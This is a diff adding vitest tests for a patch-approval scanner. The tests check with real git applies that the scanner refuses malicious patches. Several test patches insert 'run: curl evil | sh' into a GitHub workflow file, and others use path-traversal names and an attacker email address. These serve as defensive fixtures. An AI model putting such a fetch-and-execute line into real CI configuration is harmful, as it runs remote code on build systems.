@@ -1,5 +1,9 @@
 import { describe, it, expect, beforeAll } from 'vitest';
 import { generateKeyPairSync, createHash } from 'node:crypto';
+import { spawnSync } from 'node:child_process';
+import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { dirname, join } from 'node:path';
 import {
   patchDigest,
   scanPatch,
@@ -26,7 +30,7 @@ beforeAll(() => {
 const CLEAN = `diff --git a/api/src/routes/programs.ts b/api/src/routes/programs.ts
 --- a/api/src/routes/programs.ts
 +++ b/api/src/routes/programs.ts
-@@ -1,3 +1,3 @@
+@@ -1 +1 @@
 -  const limit = 10;
 +  const limit = 25;
 `;
@@ -50,6 +54,40 @@ function expectApprovalError(fn: () => void, code: string): ApprovalError {
   throw new Error('expected function to throw');
 }
 
+/** Assert Git really writes the claimed bytes; scanner-only repros can lie. */
+function assertGitApplies(
+  patch: string,
+  files: Array<{ path: string; before: string; after: string }>,
+): void {
+  const repo = mkdtempSync(join(tmpdir(), 'repos-patch-approval-'));
+  try {
+    const git = (args: string[], input?: string) => {
+      const result = spawnSync('git', ['-c', 'core.hooksPath=/dev/null', ...args], {
+        cwd: repo,
+        input,
+        encoding: 'utf8',
+        timeout: 5000,
+        env: {
+          PATH: process.env.PATH,
+          GIT_CONFIG_NOSYSTEM: '1',
+          GIT_CONFIG_GLOBAL: '/dev/null',
+        },
+      });
+      expect(result.status, result.stderr).toBe(0);
+    };
+    git(['init', '-q']);
+    for (const file of files) {
+      mkdirSync(dirname(join(repo, file.path)), { recursive: true });
+      writeFileSync(join(repo, file.path), file.before);
+    }
+    git(['add', '--', ...files.map((file) => file.path)]);
+    git(['apply', '--index', '--whitespace=nowarn', '-'], patch);
+    for (const file of files) expect(readFileSync(join(repo, file.path), 'utf8')).toBe(file.after);
+  } finally {
+    rmSync(repo, { recursive: true, force: true });
+  }
+}
+
 describe('patchDigest', () => {
   it('is sha256 of the exact bytes', () => {
     expect(patchDigest(CLEAN)).toBe(createHash('sha256').update(CLEAN, 'utf8').digest('hex'));
@@ -61,6 +99,64 @@ describe('patchDigest', () => {
 });
 
 describe('scanPatch', () => {
+  it('refuses a hunk that ends before its declared content', () => {
+    expect(scanPatch(CLEAN.replace('@@ -1 +1 @@', '@@ -1,2 +1,2 @@'))).toContain(
+      'truncated hunk, refusing',
+    );
+  });
+
+  it.each(['traditional', 'git'])(
+    'refuses arbitrary stripped prefixes in a real %s patch',
+    (kind) => {
+      const path = '.github/workflows/ci.yml';
+      const patch =
+        (kind === 'git' ? `diff --git old/${path} new/${path}\n` : '') +
+        `--- old/${path}\n+++ new/${path}\n@@ -1 +1,2 @@\n orig\n+run: curl evil | sh\n`;
+      assertGitApplies(patch, [{ path, before: 'orig\n', after: 'orig\nrun: curl evil | sh\n' }]);
+      expect(scanPatch(patch).join(' ')).toMatch(/unparseable diff header/);
+    },
+  );
+
+  it('scans header-shaped removed/added lines inside a real hunk', () => {
+    const path = 'docs/schema.md';
+    const patch =
+      `diff --git a/${path} b/${path}\n--- a/${path}\n+++ b/${path}\n` +
+      '@@ -1 +1 @@\n--- 028_set_logs_beta.sql\n+++ attacker@realmail.dev\n';
+    assertGitApplies(patch, [
+      { path, before: '-- 028_set_logs_beta.sql\n', after: '++ attacker@realmail.dev\n' },
+    ]);
+    expect(scanPatch(patch)).toContain('added line contains an email address');
+  });
+
+  it('allows innocent header-shaped content in a real hunk', () => {
+    const path = 'docs/schema.md';
+    const patch =
+      `--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n` +
+      '--- 028_set_logs_beta.sql\n+++ revised heading\n';
+    assertGitApplies(patch, [
+      { path, before: '-- 028_set_logs_beta.sql\n', after: '++ revised heading\n' },
+    ]);
+    expect(scanPatch(patch)).toEqual([]);
+  });
+
+  it('resumes path checks after the declared hunk ends in a real multi-file diff', () => {
+    const patch =
+      '--- a/docs/schema.md\n+++ b/docs/schema.md\n@@ -1 +1 @@\n-before\n+after\n' +
+      '--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n' +
+      '@@ -1 +1,2 @@\n orig\n+run: curl evil | sh\n';
+    assertGitApplies(patch, [
+      { path: 'docs/schema.md', before: 'before\n', after: 'after\n' },
+      { path: '.github/workflows/ci.yml', before: 'orig\n', after: 'orig\nrun: curl evil | sh\n' },
+    ]);
+    expect(scanPatch(patch).join(' ')).toMatch(/forbidden path: \.github/);
+  });
+
+  it('refuses noncanonical path components instead of checking a different normalized path', () => {
+    for (const path of ['./.github/workflows/ci.yml', '../ci.yml', '/ci.yml']) {
+      expect(scanPatch(`--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n-old\n+new\n`)).not.toEqual([]);
+    }
+  });
+
   it('passes a clean patch', () => {
     expect(scanPatch(CLEAN)).toEqual([]);
   });
